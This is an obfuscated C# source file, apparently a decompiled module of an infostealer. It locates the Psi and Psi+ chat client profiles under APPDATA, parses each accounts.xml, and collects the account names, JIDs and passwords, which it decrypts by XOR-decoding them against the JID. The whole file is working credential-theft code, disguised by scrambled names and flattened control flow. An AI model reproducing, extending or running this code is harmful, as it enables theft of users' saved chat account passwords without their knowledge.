using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Xml;
using p3N5Y;

namespace ZAZUx;

public class qnJnCh : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string isMpHP93t5
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public qnJnCh()
	{
		isMpHP93t5 = "Psi/Psi+";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string[] array = default;
		string filename = default;
		int num2 = default;
		List<ii68> list = default;
		while (true)
		{
			if (num == 2)
			{
				array = lkG();
				num = 3;
			}
			if (num == 5)
			{
				goto IL_0042;
			}
			goto IL_0058;
			IL_0042:
			filename = array[num2];
			num = 6;
			goto IL_0058;
			IL_0058:
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num != 4)
			{
				if (num == 3)
				{
					num2 = 0;
					num = 4;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num != 6)
				{
					continue;
				}
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(filename);
					XmlNodeList childNodes = xmlDocument.ChildNodes;
					foreach (XmlNode item in childNodes[1].ChildNodes[0])
					{
						try
						{
							list.Add(new ii68
							{
								byIdLuuGZbL = item["name"].InnerText,
								S8v = item["jid"].InnerText,
								_9H5rP7hg2 = _8wd0DYIip(item["password"].InnerText, item["jid"].InnerText),
								oVAe = "Psi/Psi+"
							});
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				num2++;
			}
			if (num2 >= array.Length)
			{
				break;
			}
			goto IL_0042;
		}
		return list;
	}

	private static string _8wd0DYIip(string NxN24RQ0j2, string xLFM)
	{
		int num = 0;
		int num2 = default;
		int num3 = default;
		string text = default;
		while (true)
		{
			if (num == 6)
			{
				num2 = 0;
				num = 7;
			}
			if (num == 10)
			{
				goto IL_0042;
			}
			goto IL_0063;
			IL_00ee:
			if (num2 < NxN24RQ0j2.Length)
			{
				goto IL_0074;
			}
			num = 6;
			goto IL_0109;
			IL_0109:
			if (num == 2)
			{
				num2 = 0;
				num = 3;
			}
			if (num == 9)
			{
				num3 += 4;
				num = 10;
			}
			if (num == 1)
			{
				text = "";
				num = 2;
			}
			if (num == 4)
			{
				goto IL_0042;
			}
			if (num == 8)
			{
				num2++;
				num = 9;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 11)
			{
				break;
			}
			continue;
			IL_0063:
			if (num == 7)
			{
				goto IL_0074;
			}
			goto IL_00ba;
			IL_00ba:
			if (num == 3)
			{
				num3 = 0;
				num = 4;
			}
			if (num == 5)
			{
				goto IL_00ee;
			}
			goto IL_0109;
			IL_0042:
			if (num3 > NxN24RQ0j2.Length - 1)
			{
				num = 11;
				goto IL_0063;
			}
			goto IL_00ee;
			IL_0074:
			text += (char)(Convert.ToByte(NxN24RQ0j2.Substring(num3, 4), 16) ^ xLFM[num2]);
			num = 8;
			goto IL_00ba;
		}
		return text;
	}

	private static string[] lkG()
	{
		int num = 0;
		string[] array = default;
		string[] array2 = default;
		string text = default;
		string[] array3 = default;
		int num2 = default;
		List<string> list = default;
		string path = default;
		int num3 = default;
		string[] directories = default;
		do
		{
			if (num == 17)
			{
				goto IL_001f;
			}
			goto IL_0036;
			IL_0036:
			if (num == 20)
			{
				goto IL_0047;
			}
			goto IL_005f;
			IL_005f:
			if (num == 6)
			{
				array = array2;
				num = 7;
			}
			if (num == 13)
			{
				goto IL_0263;
			}
			if (num == 15)
			{
				if (!File.Exists(text + "\\accounts.xml"))
				{
					goto IL_001f;
				}
				num = 16;
			}
			if (num == 4)
			{
				array2 = array3;
				num = 5;
			}
			if (num == 1)
			{
				array3 = new string[2];
				num = 2;
			}
			if (num == 7)
			{
				num2 = 0;
				num = 8;
			}
			if (num == 2)
			{
				array3[0] = Environment.GetEnvironmentVariable("APPDATA") + "\\Psi\\profiles";
				num = 3;
			}
			if (num == 8)
			{
				goto IL_0047;
			}
			if (num == 5)
			{
				list = new List<string>();
				num = 6;
			}
			if (num == 19)
			{
				goto IL_01ca;
			}
			goto IL_01e1;
			IL_027b:
			if (num == 10)
			{
				if (!Directory.Exists(path))
				{
					goto IL_01ca;
				}
				num = 11;
			}
			if (num == 16)
			{
				list.Add(text + "\\accounts.xml");
				num = 17;
			}
			if (num == 3)
			{
				array3[1] = Environment.GetEnvironmentVariable("APPDATA") + "\\Psi+\\profiles";
				num = 4;
			}
			if (num == 14)
			{
				goto IL_031d;
			}
			goto IL_0333;
			IL_0252:
			if (num == 18)
			{
				goto IL_0263;
			}
			goto IL_027b;
			IL_01e1:
			if (num == 12)
			{
				num3 = 0;
				num = 13;
			}
			if (num == 11)
			{
				directories = Directory.GetDirectories(path);
				num = 12;
			}
			if (num == 9)
			{
				goto IL_023c;
			}
			goto IL_0252;
			IL_01ca:
			num2++;
			num = 20;
			goto IL_01e1;
			IL_0047:
			if (num2 >= array.Length)
			{
				num = 21;
				goto IL_005f;
			}
			goto IL_023c;
			IL_001f:
			num3++;
			num = 18;
			goto IL_0036;
			IL_0333:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_031d:
			text = directories[num3];
			num = 15;
			goto IL_0333;
			IL_0263:
			if (num3 >= directories.Length)
			{
				num = 19;
				goto IL_027b;
			}
			goto IL_031d;
			IL_023c:
			path = array[num2];
			num = 10;
			goto IL_0252;
		}
		while (num != 21);
		return list.ToArray();
	}
}
